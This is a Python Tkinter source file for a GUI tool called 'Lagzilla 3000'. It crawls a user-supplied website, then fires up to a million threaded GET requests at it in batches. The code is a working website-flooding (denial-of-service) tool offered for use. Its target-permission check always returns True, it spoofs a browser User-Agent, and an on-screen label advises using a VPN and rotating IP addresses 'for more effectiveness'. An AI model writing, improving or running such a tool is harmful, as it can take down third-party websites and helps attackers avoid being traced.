import tkinter as tk
from tkinter import ttk
import threading
import time
import os
import sys
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import importlib
import subprocess

REQUIRED_PACKAGES = [
    "requests",
    "beautifulsoup4"
]

missing_packages = []

for pkg in REQUIRED_PACKAGES:
    try:
        importlib.import_module(pkg if pkg != "beautifulsoup4" else "bs4")
    except ImportError:
        missing_packages.append(pkg)


if missing_packages:

    fade_job = None

    def fade_to(target, step=0.05):
        global fade_job

        if fade_job:
            try:
                root.after_cancel(fade_job)
            except:
                pass

        def animate():
            global fade_job

            current = root.attributes("-alpha")

            if abs(current - target) <= step:
                root.attributes("-alpha", target)
                fade_job = None
                return

            direction = 1 if target > current else -1

            root.attributes(
                "-alpha",
                max(0, min(1, current + (step * direction)))
            )

            fade_job = root.after(10, animate)

        animate()


    def switch_view(new_func):
        def change():
            clear()
            root.attributes("-alpha", 0)
            new_func()
            fade_to(1)

        fade_to(0)
        root.after(250, change)


    def clear():
        for widget in container.winfo_children():
            widget.destroy()


    def loading_screen():

        frame = ttk.Frame(container)
        frame.pack(expand=True)

        ttk.Label(
            frame,
            text="Checking dependencies...",
            style="Title.TLabel"
        ).pack(pady=20)

        bar = ttk.Progressbar(
            frame,
            mode="indeterminate",
            length=240
        )

        bar.pack(pady=10)
        bar.start(12)

        root.after(
            900,
            lambda: switch_view(main_screen)
        )


    def main_screen():

        frame = ttk.Frame(container)
        frame.pack(
            expand=True,
            fill="both",
            padx=25,
            pady=25
        )


        ttk.Label(
            frame,
            text="Missing Dependencies",
            style="Title.TLabel"
        ).pack(pady=10)


        ttk.Label(
            frame,
            text="\n".join(missing_packages),
            foreground="#ff6b6b"
        ).pack(pady=5)


        status = ttk.Label(
            frame,
            text="Ready"
        )

        status.pack(pady=15)


        progress = ttk.Progressbar(
            frame,
            length=260,
            mode="determinate"
        )


        def install():

            install_btn.config(
                state="disabled"
            )

            cancel_btn.config(
                state="disabled"
            )

            progress.pack(
                pady=15
            )

            progress["maximum"] = len(
                missing_packages
            )


            threading.Thread(
                target=install_thread,
                args=(status, progress),
                daemon=True
            ).start()



        install_btn = ttk.Button(
            frame,
            text="Install",
            command=install
        )

        install_btn.pack(
            pady=5
        )


        cancel_btn = ttk.Button(
            frame,
            text="Cancel",
            command=root.destroy
        )

        cancel_btn.pack(
            pady=5
        )



    def install_thread(status, progress):

        try:

            for i, pkg in enumerate(
                missing_packages,
                1
            ):

                root.after(
                    0,
                    lambda p=pkg:
                    status.config(
                        text=f"Installing {p}..."
                    )
                )

                subprocess.check_call(
                    [
                        sys.executable,
                        "-m",
                        "pip",
                        "install",
                        pkg
                    ],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )

                root.after(
                    0,
                    lambda v=i:
                    progress.config(
                        value=v
                    )
                )

            root.after(
                0,
                lambda:
                status.config(
                    text="Installation complete!"
                )
            )

            root.after(
                800,
                lambda:
                switch_view(
                    restart_screen
                )
            )

        except Exception as e:

            root.after(
                0,
                lambda:
                status.config(
                    text=f"Install failed:\n{e}"
                )
            )


    def restart_screen():

        frame = ttk.Frame(container)

        frame.pack(
            expand=True
        )

        ttk.Label(
            frame,
            text="Restart the application?",
            style="Title.TLabel"
        ).pack(
            pady=25
        )

        buttons = ttk.Frame(frame)

        buttons.pack()

        ttk.Button(
            buttons,
            text="Restart",
            command=restart_app
        ).pack(
            side="left",
            padx=10
        )

        ttk.Button(
            buttons,
            text="Exit",
            command=root.destroy
        ).pack(
            side="right",
            padx=10
        )


    def restart_app():

        try:

            if getattr(sys, "frozen", False):

                subprocess.Popen(
                    [sys.executable],
                    cwd=os.path.dirname(sys.executable)
                )

            else:

                subprocess.Popen(
                    [sys.executable] + sys.argv,
                    cwd=os.path.dirname(os.path.abspath(__file__))
                )

            root.destroy()
            sys.exit()

        except Exception as e:
            print(e)

if missing_packages:

    root = tk.Tk()

    try:
        root.iconbitmap("")
    except:
        pass

    root.title(
        "Dependency Installer"
    )

    root.geometry(
        "420x320"
    )

    root.configure(
        bg="#1e1e1e"
    )

    root.attributes(
        "-alpha",
        0
    )


    style = ttk.Style()

    style.theme_use(
        "clam"
    )

    style.configure(
        "TFrame",
        background="#1e1e1e"
    )

    style.configure(
        "TLabel",
        background="#1e1e1e",
        foreground="white"
    )

    style.configure(
        "Title.TLabel",
        font=(
            "Segoe UI",
            15,
            "bold"
        ),
        foreground="white"
    )

    style.configure(
        "TButton",
        padding=7
    )


    container = ttk.Frame(
        root
    )

    container.pack(
        expand=True,
        fill="both"
    )


    root.after(
        50,
        lambda:
        [
            loading_screen(),
            fade_to(1)
        ]
    )


    root.mainloop()

    sys.exit()


import requests
from bs4 import BeautifulSoup


running = False
cooldown = False
current_ip = None

REQUEST_LIMIT = 1000000


def gui_update(func):
    root.after(0, func)


def log(text):
    def update():
        output.insert(tk.END, text + "\n")
        output.see(tk.END)

    gui_update(update)


def check_ip_loop():
    global current_ip

    while True:
        try:
            ip = requests.get(
                "https://api.ipify.org",
                timeout=5
            ).text

            if ip != current_ip:
                current_ip = ip

                gui_update(
                    lambda:
                    ip_label.config(
                        text=f"Current IP: {ip}"
                    )
                )

        except Exception:
            gui_update(
                lambda:
                ip_label.config(
                    text="Current IP: Unknown"
                )
            )

        time.sleep(120)


def clamp_settings():
    try:
        count = int(amount_entry.get())

        if count < 1:
            count = 1

        if count > REQUEST_LIMIT:
            count = REQUEST_LIMIT


        delay = float(delay_entry.get())

        if delay < 0:
            delay = 0


        batch = int(batch_entry.get())

        if batch < 1:
            batch = 1

        if batch > count:
            batch = count


        amount_entry.delete(0, tk.END)
        amount_entry.insert(0, str(count))

        delay_entry.delete(0, tk.END)
        delay_entry.insert(0, str(delay))

        batch_entry.delete(0, tk.END)
        batch_entry.insert(0, str(batch))


        return count, delay, batch

    except Exception:
        return None


def is_allowed_target(url):
    return True


def analyse_site(target, crawl_depth=2, max_pages=50):

    profile = {
        "url": target,
        "status": None,
        "headers": {},
        "links": [],
        "robots": None,
        "sitemap": None,
        "response_time": None,
        "content_length": 0,
        "server": None,
        "content_type": None,
        "redirects": [],
        "crawl_pages": [],
        "error": None
    }

    session = requests.Session()

    session.headers.update({
        "User-Agent": (
            "Mozilla/5.0 "
            "Chrome/120 Safari/537.36"
        )
    })

    visited = set()
    discovered = set()

    parsed_target = urlparse(target)

    domain = parsed_target.netloc

    queue = [
        (target, 0)
    ]

    discovered.add(target)

    try:

        while queue and len(visited) < max_pages:

            current_url, depth = queue.pop(0)

            if current_url in visited:
                continue

            visited.add(current_url)

            page_start = time.perf_counter()

            response = session.get(
                current_url,
                timeout=10,
                allow_redirects=True
            )

            elapsed = (
                time.perf_counter()
                - page_start
            )

            if response.status_code >= 400 and response.status_code < 500:

                if depth == 0:
                    profile["status"] = response.status_code
                    profile["headers"] = dict(response.headers)
                    profile["content_type"] = response.headers.get("Content-Type")

                profile["crawl_pages"].append({
                    "url": current_url,
                    "status": response.status_code,
                    "time": elapsed,
                    "size": len(response.content)
                })

                continue


            if depth == 0:

                profile["response_time"] = elapsed

                profile["status"] = response.status_code

                profile["headers"] = dict(
                    response.headers
                )

                profile["content_length"] = len(
                    response.content
                )

                profile["server"] = response.headers.get(
                    "Server"
                )

                profile["content_type"] = response.headers.get(
                    "Content-Type"
                )

                for item in response.history:

                    profile["redirects"].append({
                        "status": item.status_code,
                        "url": item.url
                    })


            profile["crawl_pages"].append({
                "url": current_url,
                "status": response.status_code,
                "time": elapsed,
                "size": len(response.content)
            })


            if "text/html" not in response.headers.get(
                "Content-Type",
                ""
            ):
                continue


            soup = BeautifulSoup(
                response.text,
                "html.parser"
            )


            for item in soup.find_all(
                "a",
                href=True
            ):

                link = urljoin(
                    current_url,
                    item["href"]
                )

                parsed = urlparse(link)

                if parsed.netloc == domain:

                    clean = (
                        parsed.scheme
                        + "://"
                        + parsed.netloc
                        + parsed.path
                    )

                    if clean not in discovered:

                        discovered.add(clean)


                        if (
                            depth < crawl_depth
                            and clean not in visited
                            and len(discovered) < max_pages
                        ):

                            queue.append(
                                (
                                    clean,
                                    depth + 1
                                )
                            )


        profile["links"] = list(
            discovered
        )[:max_pages]


        robots = session.get(
            urljoin(
                target,
                "/robots.txt"
            ),
            timeout=5
        )

        if robots.status_code == 200:

            profile["robots"] = robots.text[:2000]


        sitemap = session.get(
            urljoin(
                target,
                "/sitemap.xml"
            ),
            timeout=5
        )

        if sitemap.status_code == 200:

            profile["sitemap"] = sitemap.text[:2000]


    except Exception as e:

        profile["error"] = str(e)


    return profile

def create_decision_plan(profile, settings):

    count, delay, batch_size = settings

    crawl_pages = profile.get(
        "crawl_pages",
        []
    )

    response_time = profile.get(
        "response_time"
    )

    status = profile.get(
        "status"
    )

    headers = profile.get(
        "headers"
     ) or {}  
    

    redirects = profile.get(
        "redirects"
     ) or []
    

    content_type = profile.get(
        "content_type"
      ) or ""


    plan = {
        "workers": 5,
        "batch_size": batch_size,
        "delay": max(delay, 0),
        "timeout": 5,
        "summary": [],
        "adaptive": True,
    }


    if status is None or not crawl_pages:

        plan["workers"] = 1
        plan["batch_size"] = 1
        plan["delay"] += 5
        plan["timeout"] = 10

        if status is None:
            plan["summary"].append(
                "No server response detected"
            )

        if not crawl_pages:
            plan["summary"].append(
                "No crawl data available, using safe defaults"
            )


    if profile.get("error"):

        plan["workers"] = 1
        plan["batch_size"] = 1
        plan["delay"] += 5
        plan["timeout"] = 15

        plan["summary"].append(
            "Analysis failed, safe mode enabled"
        )

    crawl_times = [
        page["time"]
        for page in crawl_pages
        if page.get("time") is not None
    ]


    if crawl_times:

        crawl_average = (
            sum(crawl_times)
            /
            len(crawl_times)
        )

        if crawl_average >= 3:

            plan["summary"].append(
                "Slow page speed detected"
            )

        elif crawl_average >= 1:

            plan["summary"].append(
                "Moderate page speed detected"
            )

        else:

            plan["summary"].append(
                "Fast pages detected"
            )


        plan["summary"].append(
            f"{len(crawl_pages)} pages analysed"
        )


    if response_time is not None:

        if response_time >= 3:

            plan["summary"].append(
                "Slow homepage detected"
            )

        elif response_time >= 1:

            plan["summary"].append(
                "Moderate homepage detected"
            )

        else:

            plan["summary"].append(
                "Fast homepage detected"
            )


    if status is not None:

        if status >= 500:

            plan["workers"] = 1
            plan["batch_size"] = 1
            plan["delay"] += 10

            plan["summary"].append(
                "Server error detected"
            )


        elif status == 429:

            plan["workers"] = 1
            plan["batch_size"] = 1
            plan["delay"] += 15

            plan["summary"].append(
                "Rate limiting detected"
            )


    if redirects:

        plan["timeout"] += 5

        plan["summary"].append(
            f"{len(redirects)} redirects detected"
        )


    if "Retry-After" in headers:

        plan["workers"] = 1
        plan["batch_size"] = 1
        plan["delay"] += 10

        plan["summary"].append(
            "Retry policy detected"
        )


    if "Cache-Control" in headers:

        plan["summary"].append(
            "Cache headers detected"
        )


    if "gzip" in headers.get(
        "Content-Encoding",
        ""
    ):

        plan["summary"].append(
            "Compression detected"
        )


    if "text/html" in content_type:

        plan["summary"].append(
            "HTML application detected"
        )


    plan["workers"] = min(
        max(plan["workers"], 1),
        10
    )

    plan["batch_size"] = max(
        plan["batch_size"],
        1
    )

    plan["timeout"] = min(
        max(plan["timeout"], 3),
        30
    )


    return plan

def worker():

    global running, cooldown

    url = url_entry.get().strip()
    settings = clamp_settings()

    if not settings:
        gui_update(lambda: status_label.config(text="Invalid settings"))
        return

    count, delay, batch_size = settings

    if not url.startswith(("http://", "https://")):
        gui_update(lambda: status_label.config(text="Invalid URL"))
        return

    if not is_allowed_target(url):
        gui_update(lambda: status_label.config(text="Target not allowed"))
        return

    running = True
    cooldown = False

    gui_update(lambda: (
        start_button.config(state="disabled"),
        stop_button.config(state="normal"),
        status_label.config(text="Analysing website..."),
        progress.config(maximum=count, value=0)
    ))

    site_profile = analyse_site(
        url,
        crawl_depth=2,
        max_pages=50
    )

    if site_profile.get("error"):

        log(
            "Analysis failed: "
            + site_profile["error"]
        )

        running = False

        gui_update(lambda:
            status_label.config(
                text="Analysis failed"
            )
        )

        return

    decision_plan = create_decision_plan(
        site_profile,
        settings
    )

    log("Analysis complete")

    for item in decision_plan["summary"]:
        log("- " + item)

    gui_update(lambda:
        status_label.config(
            text="Running"
        )
    )

    thread_local = threading.local()

    stats = {
        "errors": 0,
        "success": 0,
        "times": []
    }

    def get_session():

        if not hasattr(thread_local, "session"):

            session = requests.Session()

            session.headers.update({
                "User-Agent": (
                    "Mozilla/5.0 "
                    "Chrome/120 Safari/537.36"
                ),
                "Accept": "*/*",
                "Accept-Language": (
                    "en-US,en;q=0.9"
                )
            })

            thread_local.session = session

        return thread_local.session


    def request_task(request_id):

        session = get_session()
        start = time.perf_counter()

        try:

            response = session.get(
                url,
                timeout=decision_plan["timeout"]
            )

            elapsed = (
                time.perf_counter()
                - start
            )

            return {
                "id": request_id,
                "status": response.status_code,
                "time": elapsed,
                "error": None
            }

        except requests.exceptions.Timeout:

            return {
                "id": request_id,
                "status": None,
                "time": None,
                "error": "Timeout"
            }

        except requests.exceptions.ConnectionError as e:

            return {
                "id": request_id,
                "status": None,
                "time": None,
                "error": str(e)
            }

        except Exception as e:

            return {
                "id": request_id,
                "status": None,
                "time": None,
                "error": str(e)
            }


    completed = 0

    while running and completed < count:

        current_batch = min(
            decision_plan["batch_size"],
            count - completed
        )

        gui_update(
            lambda b=current_batch:
            status_label.config(
                text=f"Running batch {b}"
            )
        )

        with ThreadPoolExecutor(
            max_workers=min(
                decision_plan["workers"],
                10
            )
        ) as executor:

            futures = [
                executor.submit(
                    request_task,
                    completed + i + 1
                )
                for i in range(current_batch)
            ]

            for future in as_completed(futures):

                if not running:
                    break

                result = future.result()

                completed += 1

                if result["error"]:

                    stats["errors"] += 1

                    log(
                        f"{result['id']}: "
                        f"{result['error']}"
                    )

                else:

                    stats["success"] += 1

                    elapsed = result.get("time")

                    if elapsed is not None:

                        stats["times"].append(
                            elapsed
                        )

                        log(
                            f"{result['id']}: "
                            f"{result['status']} "
                            f"{elapsed:.3f}s"
                        )

                gui_update(
                    lambda c=completed:
                    progress.config(
                        value=c
                    )
                )

        if stats["errors"] >= 3:

            decision_plan["workers"] = 1
            decision_plan["batch_size"] = 1
            decision_plan["delay"] += 5

            stats["errors"] = 0

            log(
                "Adjusted: errors detected"
            )

        if running and completed < count:

            time.sleep(
                decision_plan["delay"]
            )


    running = False

    gui_update(lambda: (
        status_label.config(
            text="Cooldown"
        ),
        start_button.config(
            state="disabled"
        ),
        stop_button.config(
            state="disabled"
        )
    ))

    cooldown = True

    time.sleep(2)

    cooldown = False

    gui_update(lambda: (
        status_label.config(
            text="Ready"
        ),
        start_button.config(
            state="normal"
        ),
        stop_button.config(
            state="disabled"
        ),
        progress.config(
            value=0
        )
    ))

def start():
    global running

    if not running and not cooldown:

        output.delete(
            "1.0",
            tk.END
        )

        threading.Thread(
            target=worker,
            daemon=True
        ).start()


def stop():
    global running

    running = False

    gui_update(
        lambda:
        status_label.config(
            text="Stopped"
        )
    )


def close():
    global running

    running = False
    root.destroy()


def get_resource_path(filename):
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, filename)
    return os.path.join(os.path.dirname(__file__), filename)

root = tk.Tk()

icon_path = get_resource_path("icon.ico")

try:
    root.wm_iconbitmap(icon_path)
except Exception as e:
    print("Icon failed:", e)

root.title(
    "Lagzilla 3000"
)

root.geometry(
    "750x700"
)

root.minsize(
    550,
    500
)

root.protocol(
    "WM_DELETE_WINDOW",
    close
)


style = ttk.Style()
style.theme_use(
    "clam"
)


main = ttk.Frame(
    root,
    padding=15
)

main.pack(
    fill="both",
    expand=True
)


main.columnconfigure(
    0,
    weight=1
)

main.rowconfigure(
    10,
    weight=1
)


title = ttk.Label(
    main,
    text="Lagzilla 3000",
    font=(
        "Segoe UI",
        22,
        "bold"
    )
)

title.grid(
    row=0,
    column=0,
    pady=10
)


limit_label = ttk.Label(
    main,
    text=f"Maximum {REQUEST_LIMIT} Requests"
)

limit_label.grid(
    row=1,
    column=0
)


settings = ttk.LabelFrame(
    main,
    text="Settings",
    padding=10
)

settings.grid(
    row=2,
    column=0,
    sticky="ew",
    pady=10
)


settings.columnconfigure(
    1,
    weight=1
)


fields = [
    ("Target URL", "url"),
    ("Requests", "amount"),
    ("Delay", "delay"),
    ("Batch size", "batch")
]


for row, (label, _) in enumerate(fields):

    ttk.Label(
        settings,
        text=label
    ).grid(
        row=row,
        column=0,
        padx=5,
        pady=5
    )


url_entry = ttk.Entry(
    settings
)

url_entry.grid(
    row=0,
    column=1,
    sticky="ew"
)


amount_entry = ttk.Entry(
    settings
)

amount_entry.insert(
    0,
    "10"
)

amount_entry.grid(
    row=1,
    column=1,
    sticky="ew"
)


delay_entry = ttk.Entry(
    settings
)

delay_entry.insert(
    0,
    "1"
)

delay_entry.grid(
    row=2,
    column=1,
    sticky="ew"
)


batch_entry = ttk.Entry(
    settings
)

batch_entry.insert(
    0,
    "3"
)

batch_entry.grid(
    row=3,
    column=1,
    sticky="ew"
)


ip_label = ttk.Label(
    main,
    text="Current IP: Checking..."
)

ip_label.grid(
    row=3,
    column=0,
    pady=5
)

vpn_label = ttk.Label(
    main,
    text="Recommended to use a VPN and regularly rotate your IP address for more effectiveness.",
    wraplength=600,
    foreground="red"
)

vpn_label.grid(row=4, column=0, pady=5)


progress = ttk.Progressbar(
    main,
    mode="determinate"
)

progress.grid(
    row=5,
    column=0,
    sticky="ew",
    pady=10
)


buttons = ttk.Frame(
    main
)

buttons.grid(
    row=6,
    column=0
)


start_button = ttk.Button(
    buttons,
    text="Start",
    command=start
)

start_button.pack(
    side="left",
    padx=10
)


stop_button = ttk.Button(
    buttons,
    text="Stop",
    command=stop
)

stop_button.pack(
    side="left",
    padx=10
)

stop_button.config(
    state="disabled"
)


status_label = ttk.Label(
    main,
    text="Ready"
)

status_label.grid(
    row=7,
    column=0,
    pady=5
)


output_frame = ttk.LabelFrame(
    main,
    text="Output",
    padding=5
)

output_frame.grid(
    row=10,
    column=0,
    sticky="nsew"
)


output_frame.columnconfigure(
    0,
    weight=1
)

output_frame.rowconfigure(
    0,
    weight=1
)


output = tk.Text(
    output_frame,
    wrap="word"
)

output.grid(
    row=0,
    column=0,
    sticky="nsew"
)


threading.Thread(
    target=check_ip_loop,
    daemon=True
).start()


root.mainloop()
